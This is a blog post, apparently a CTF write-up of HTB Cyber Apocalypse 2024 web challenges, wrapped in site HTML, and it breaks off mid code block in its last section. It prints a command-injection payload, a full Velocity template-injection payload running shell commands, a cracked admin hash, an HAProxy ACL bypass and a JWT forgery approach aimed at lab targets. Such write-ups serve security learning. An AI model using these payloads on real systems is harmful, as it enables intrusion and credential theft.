<!DOCTYPE html>
<html lang="en-us" dir="ltr">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is the writeup of HTB cyber apocalypse 2024 web challenges.
I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
Web Category  TimeKORP rating: very easy
Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
<title>HTB_cyberapocalypse_2024</title>

<link rel='canonical' href='https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/'>

<link rel="stylesheet" href="/scss/style.min.abbd69b2908fdfcd5179898beaafd374514a86538d81639ddd2c58c06ae54e40.css"><meta property='og:title' content='HTB_cyberapocalypse_2024'>
<meta property='og:description' content='This is the writeup of HTB cyber apocalypse 2024 web challenges.
I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
Web Category  TimeKORP rating: very easy
Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; .'>
<meta property='og:url' content='https://f0rk3b0mb.github.io/p/htb_cyberapocalypse_2024/'>
<meta property='og:site_name' content='f0rk3b0mb'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2024-03-11T13:23:40&#43;03:00'/><meta property='article:modified_time' content='2024-03-11T13:23:40&#43;03:00'/><meta property='og:image' content='https://f0rk3b0mb.github.io/cover/ca2024.png' />
<meta name="twitter:site" content="@f0rk3b0mb">
    <meta name="twitter:creator" content="@f0rk3b0mb"><meta name="twitter:title" content="HTB_cyberapocalypse_2024">
<meta name="twitter:description" content="This is the writeup of HTB cyber apocalypse 2024 web challenges.
I participated with my team &amp;ldquo;Gang de la Sinfonia&amp;rdquo;.
Web Category  TimeKORP rating: very easy
Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  &amp;lt;?php class TimeModel { public function __construct($format) { $this-&amp;gt;command = &amp;#34;date &amp;#39;&#43;&amp;#34; ."><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='https://f0rk3b0mb.github.io/cover/ca2024.png' />
<script async src="https://www.googletagmanager.com/gtag/js?id=G-45FL0WGH80"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-45FL0WGH80', { 'anonymize_ip': false });
}
</script>

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "dark");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/profile_huf077503059140d44e06db4f515bdfac7_70175_300x0_resize_q75_box.jpg" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
                    <span class="emoji">ðŸ˜Ž</span>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">f0rk3b0mb</a></h1>
            <h2 class="site-description">Ctf player p3rf3ctr00t_ke | Cybersecurity | Infosec | web_security_analyst</h2>
        </div>
    </header><ol class="social-menu">
            
                <li>
                    <a 
                        href='https://discordapp.com/users/888054460956422195'
                        target="_blank"
                        title="discord"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" encoding="UTF-8"?>
<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
<svg width="800px" height="800px" viewBox="0 -28.5 256 256" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" preserveAspectRatio="xMidYMid">
    <g>
        <path d="M216.856339,16.5966031 C200.285002,8.84328665 182.566144,3.2084988 164.041564,0 C161.766523,4.11318106 159.108624,9.64549908 157.276099,14.0464379 C137.583995,11.0849896 118.072967,11.0849896 98.7430163,14.0464379 C96.9108417,9.64549908 94.1925838,4.11318106 91.8971895,0 C73.3526068,3.2084988 55.6133949,8.86399117 39.0420583,16.6376612 C5.61752293,67.146514 -3.4433191,116.400813 1.08711069,164.955721 C23.2560196,181.510915 44.7403634,191.567697 65.8621325,198.148576 C71.0772151,190.971126 75.7283628,183.341335 79.7352139,175.300261 C72.104019,172.400575 64.7949724,168.822202 57.8887866,164.667963 C59.7209612,163.310589 61.5131304,161.891452 63.2445898,160.431257 C105.36741,180.133187 151.134928,180.133187 192.754523,160.431257 C194.506336,161.891452 196.298154,163.310589 198.110326,164.667963 C191.183787,168.842556 183.854737,172.420929 176.223542,175.320965 C180.230393,183.341335 184.861538,190.991831 190.096624,198.16893 C211.238746,191.588051 232.743023,181.531619 254.911949,164.955721 C260.227747,108.668201 245.831087,59.8662432 216.856339,16.5966031 Z M85.4738752,135.09489 C72.8290281,135.09489 62.4592217,123.290155 62.4592217,108.914901 C62.4592217,94.5396472 72.607595,82.7145587 85.4738752,82.7145587 C98.3405064,82.7145587 108.709962,94.5189427 108.488529,108.914901 C108.508531,123.290155 98.3405064,135.09489 85.4738752,135.09489 Z M170.525237,135.09489 C157.88039,135.09489 147.510584,123.290155 147.510584,108.914901 C147.510584,94.5396472 157.658606,82.7145587 170.525237,82.7145587 C183.391518,82.7145587 193.761324,94.5189427 193.539891,108.914901 C193.539891,123.290155 183.391518,135.09489 170.525237,135.09489 Z" fill="#5865F2" fill-rule="nonzero">
</path>
    </g>
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/f0rk3b0mb'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
</svg>



                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://ke.linkedin.com/in/abel-biketi-261212257'
                        target="_blank"
                        title="linkedin"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!-- Uploaded to: SVG Repo, www.svgrepo.com, Generator: SVG Repo Mixer Tools -->
<svg width="800px" height="800px" viewBox="0 -2 44 44" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>LinkedIn-color</title>
    <desc>Created with Sketch.</desc>
    <defs>

</defs>
    <g id="Icons" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Color-" transform="translate(-702.000000, -265.000000)" fill="#007EBB">
            <path d="M746,305 L736.2754,305 L736.2754,290.9384 C736.2754,287.257796 734.754233,284.74515 731.409219,284.74515 C728.850659,284.74515 727.427799,286.440738 726.765522,288.074854 C726.517168,288.661395 726.555974,289.478453 726.555974,290.295511 L726.555974,305 L716.921919,305 C716.921919,305 717.046096,280.091247 716.921919,277.827047 L726.555974,277.827047 L726.555974,282.091631 C727.125118,280.226996 730.203669,277.565794 735.116416,277.565794 C741.21143,277.565794 746,281.474355 746,289.890824 L746,305 L746,305 Z M707.17921,274.428187 L707.117121,274.428187 C704.0127,274.428187 702,272.350964 702,269.717936 C702,267.033681 704.072201,265 707.238711,265 C710.402634,265 712.348071,267.028559 712.41016,269.710252 C712.41016,272.34328 710.402634,274.428187 707.17921,274.428187 L707.17921,274.428187 L707.17921,274.428187 Z M703.109831,277.827047 L711.685795,277.827047 L711.685795,305 L703.109831,305 L703.109831,277.827047 L703.109831,277.827047 Z" id="LinkedIn">

</path>
        </g>
    </g>
</svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://twitter.com/f0rk3b0mb'
                        target="_blank"
                        title="twitter"
                        rel="me"
                    >
                        
                        
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
</svg>



                        
                    </a>
                </li>
            
        </ol><ol class="menu" id="main-menu">
        
        
        
        <li >
            <a href='/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        
        <li >
            <a href='/search/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
        
        <li >
            <a href='/posts' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="5" cy="19" r="1" />
  <path d="M4 4a16 16 0 0 1 16 16" />
  <path d="M4 11a9 9 0 0 1 9 9" />
</svg>



                
                <span>posts</span>
            </a>
        </li>
        
        
        <li >
            <a href='/archives/' >
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        
        <li >
            <a href='/about' target="_blank">
                
                
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>about</span>
            </a>
        </li>
        

        <div class="menu-bottom-section">
            
            
                <li id="dark-mode-toggle">
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="8" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="16" cy="12" r="2" />
  <rect x="2" y="6" width="20" height="12" rx="6" />
</svg>



                    <span>Dark Mode</span>
                </li>
            
        </div>
    </ol>
</aside>

    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ol>
    <li>
      <ol>
        <li><a href="#web-category">Web Category</a>
          <ol>
            <li><a href="#timekorp">TimeKORP</a></li>
            <li><a href="#korp-terminal">KORP terminal</a></li>
            <li><a href="#flag-command">Flag command</a></li>
            <li><a href="#labrinth-linguist">Labrinth Linguist</a></li>
            <li><a href="#locktalk">Locktalk</a></li>
            <li><a href="#testimonial">Testimonial</a></li>
          </ol>
        </li>
      </ol>
    </li>
  </ol>
</nav>
        </div>
    </section>

            
        
    </aside>


            <main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/p/htb_cyberapocalypse_2024/">
                
                    <img src="/cover/ca2024.png" loading="lazy" alt="Featured image of post HTB_cyberapocalypse_2024" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/writeups/" style="background-color: #2a9d8f; color: #fff;">
                ctf writeups
            </a>
        
    </header>
    

    <div class="article-title-wrapper">
        <h2 class="article-title">
            <a href="/p/htb_cyberapocalypse_2024/">HTB_cyberapocalypse_2024</a>
        </h2>
    
        
    </div>

    
    
    
    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Mar 11, 2024</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    5 minute read
                </time>
            </div>
        
    </footer>
    

    
</div>

</header>

    <section class="article-content">
    
    
    <p>This is the writeup of HTB cyber apocalypse 2024 web challenges.</p>
<p>I participated with my team &ldquo;Gang de la Sinfonia&rdquo;.</p>
<h3 id="web-category">Web Category</h3>
<hr>
<h4 id="timekorp">TimeKORP</h4>
<p>rating: very easy</p>
<p>Here you are provided with a webpage that has a parameter ?format=%H:%M:%D , from the source code it was running linux date command from that syntax.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?php
class TimeModel
{
    public function __construct($format)
    {
        $this-&gt;command = &#34;date &#39;+&#34; . $format . &#34;&#39; 2&gt;&amp;1&#34;;
    }

    public function getTime()
    {
        $time = exec($this-&gt;command);
        $res  = isset($time) ? $time : &#39;?&#39;;
        return $res;
    }
}
</code></pre></td></tr></table>
</div>
</div><p>This is classic command injection.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">payload :    %H:%M:%D&#39;;cat flag.txt

</code></pre></td></tr></table>
</div>
</div><p>flag: HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3}</p>
<p><img src="/images/ca2024/cmd.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h4 id="korp-terminal">KORP terminal</h4>
<p>rating: very easy</p>
<p>For this challnge you are provided with a login page that requires a username and password. So it has to be login bypass.</p>
<p>Given the rating of this challenge just throw sqlmap at it. You can also confirm this by using a single quote ,it return a sql error.</p>
<p>Output from slqmap</p>
<p><img src="/images/ca2024/sqlmap.png"
	
	
	
	loading="lazy"
	
		alt="sqlmap"
	
	
></p>
<p>From this we get a user admin and the password hash.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">admin: $2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.

</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">hashcat -m 3200 hashcat.txt /usr/share/wordlists/rockyou.txt

$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.:password123

</code></pre></td></tr></table>
</div>
</div><p>Cracking the password using hashcat we get the password : password123</p>
<p>We can then login to get the flag</p>
<p>flag: HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}</p>
<p><img src="/images/ca2024/login.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h4 id="flag-command">Flag command</h4>
<p>rating: very easy</p>
<p>Here we are given an applicating that requires a bunch of commands to navigate a puzzle. When you intercept the traffic using burp you will see an endpoint with a  list of the commands.</p>
<p><img src="/images/ca2024/options.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<p>Here we can see a secret command. Using it&hellip;</p>
<p>flag: HTB{D3v3l0p3r_t00l5_4r3_b35t_wh4t_y0u_Th1nk??!}</p>
<p><img src="/images/ca2024/flag_command.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h4 id="labrinth-linguist">Labrinth Linguist</h4>
<p>rating: easy</p>
<p>Here we are given a webapp that translates text that we give it.</p>
<p>Oooooh its a java application. I wasnt expecting thsi to be straight forward. But &hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">String template = &#34;&#34;;

        try {
            template = readFileToString(&#34;/app/src/main/resources/templates/index.html&#34;, textString);
        } catch (IOException e) {
            e.printStackTrace();
        }
</code></pre></td></tr></table>
</div>
</div><p>Our input was being used in a template. This is dangerous if no filters are applied. I quickly googled SSTI in java (Server Side Template Injection) payloads. Got this &raquo; <a class="link" href="https://iwconnect.com/apache-velocity-server-side-template-injection/"  target="_blank" rel="noopener"
    >here</a> .</p>
<p>From here we can execute commands and cat the flag. Credits to Anshul for doing this. I had a problem using the payload in burp suite due to the newlines.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">#set($s=&#34;&#34;)
            #set($stringClass=$s.getClass())
            #set($stringBuilderClass=$stringClass.forName(&#34;java.lang.StringBuilder&#34;))
            #set($inputStreamClass=$stringClass.forName(&#34;java.io.InputStream&#34;))
            #set($readerClass=$stringClass.forName(&#34;java.io.Reader&#34;))
            #set($inputStreamReaderClass=$stringClass.forName(&#34;java.io.InputStreamReader&#34;))
            #set($bufferedReaderClass=$stringClass.forName(&#34;java.io.BufferedReader&#34;))
            #set($collectorsClass=$stringClass.forName(&#34;java.util.stream.Collectors&#34;))
            #set($systemClass=$stringClass.forName(&#34;java.lang.System&#34;))
            #set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
            #set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
            #set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

            #set($runtime=$stringClass.forName(&#34;java.lang.Runtime&#34;).getRuntime())
            #set($process=$runtime.exec(&#34;cat ../flag2023911480.txt&#34;))
            #set($null=$process.waitFor() )

            #set($inputStream=$process.getInputStream())
            #set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
            #set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
            #set($stringBuilder=$stringBuilderConstructor.newInstance())

            #set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

            $output
</code></pre></td></tr></table>
</div>
</div><p>Just use the payload in the browser and capture the request in burp.</p>
<p>flag : HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}</p>
<p><img src="/images/ca2024/ssti.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h4 id="locktalk">Locktalk</h4>
<p>rating: medium</p>
<p>This is where things got interesting.</p>
<p>Here you are given a webapplication with an api blueprint.</p>
<p>The api had three routes:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">/flag   protected by middleware

/chat/&lt;int:chat_id&gt;  protected by middleware

/get_ticket  open but blocked by ha proxy

</code></pre></td></tr></table>
</div>
</div><p>A quick look at the proxy configuration</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }

</code></pre></td></tr></table>
</div>
</div><p>So we had to find a way to bypass this. I used a lot of time on this part. Until i found this &raquo; <a class="link" href="https://www.haproxy.com/blog/december-2023-cve-2023-45539-haproxy-accepts-as-part-of-the-uri-component-fixed#:~:text=HAProxy%20before%202.8.,png%20to%20a%20static%20server."  target="_blank" rel="noopener"
    >here</a></p>
<p>To make your search easier you had to find the ha proxy version from the dockerfile : PS i had forgotten do thsi , it could have made my work easier.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">WORKDIR /tmp
RUN wget https://www.haproxy.org/download/2.8/src/haproxy-2.8.1.tar.gz &amp;&amp; \
    tar zxvf haproxy-*.tar.gz &amp;&amp; cd haproxy-* &amp;&amp; \
    make TARGET=linux-musl &amp;&amp; \
    make install
RUN rm -rf *

</code></pre></td></tr></table>
</div>
</div><p>From the article if we make a request to /api/v1/get_ticket we get denied but if we make request to /api/v1/get_ticket# we bypass the acl.</p>
<p>From here i gotr the jwt token. I tries common methos of exploiting jwt but none of them worked. UNtil i searched for a vulnerability in python_jwt==3.3.3 from the requirements.txt</p>
<p>I found this vulnerability that enables us to bypass the jwt verification &raquo; <a class="link" href="https://github.com/advisories/GHSA-5p8v-58qm-c7fp"  target="_blank" rel="noopener"
    >here</a> and for the exploit &raquo; <a class="link" href="https://github.com/user0x1337/CVE-2022-39227"  target="_blank" rel="noopener"
    >here</a></p>
<p><img src="/images/ca2024/ha.png"
	
	
	
	loading="lazy"
	
		alt="exp"
	
	
></p>
<p>We change our role to administrator and then read the flag</p>
<p>flag: HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}</p>
<p><img src="/images/ca2024/pyjwt.png"
	
	
	
	loading="lazy"
	
		alt="flag"
	
	
></p>
<hr>
<h4 id="testimonial">Testimonial</h4>
<p>Here we are given a webapplication that accepts parameters customer and testimonial.</p>
<p>It is a go webapplication witha  grpc endpoint. I saw some people asking on the discord why there were two ip addresses. One if for the main webapp  and one was for grpc. Read more about grpc &raquo; <a class="link" href="https://google.com"  target="_blank" rel="noopener"
    >here</a></p>
<p>Ive encountered with grpc before. So the tools we will need are grpcurl and grpcui. In this context grpcui will not work.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">grpcurl  -plaintext  -import-path ./  -proto ptypes.proto -d &#39;{&#34;customer&#34;: &#34;examplecusomer&#34;, &#34;testimonial&#34;: &#34;exampletestimonial&#34;}&#39; 94.237.59.119:45387 RickyService.SubmitTestimonial

</code></pre></td></tr></table>
</div>
</div><p>Above is the format for grpcurl. Breakdown:</p>
<ul>
<li>
<p>ptypes.proto file is in the pb folder . This is used to enable grpcurl to interact with the server since service enumaration was disables . This is what caused grpcui not to work.</p>
</li>
<li>
<p>The service and method name can be found in the source code.</p>
</li>
</ul>
<p>Using this will also enable you to bypass the filter that was placed in the code</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
